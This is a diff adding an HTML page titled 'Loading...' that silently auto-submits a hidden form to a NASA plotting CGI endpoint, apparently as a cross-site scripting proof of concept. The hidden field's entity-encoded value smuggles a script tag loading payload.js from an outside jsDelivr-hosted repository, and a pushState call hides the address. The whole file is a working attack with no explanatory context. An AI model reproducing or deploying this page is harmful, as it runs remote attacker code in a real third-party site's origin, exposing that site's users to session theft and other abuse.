@@ -1,1 +1,17 @@
-
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <form action="https://wwwastro.msfc.nasa.gov/cgi-aft/plt/htmlqdp" method="POST">
+      <input type="hidden" name="qdpdata" value="I&#32;c&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#32;3&#32;&#32;&#32;&#32;&#32;&#13;&#10;&lt;script&#32;src=&quot;https://cdn.jsdelivr.net/gh/ciscothehackergod/payload.js@main/payload.js&quot;&gt;&lt;&#47;script&gt;&#13;&#10;&#13;&#10;" />
+      <input type="hidden" name="HARD" value="PNG" />
+      <input type="hidden" name="runqdp" value="Create Plot" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
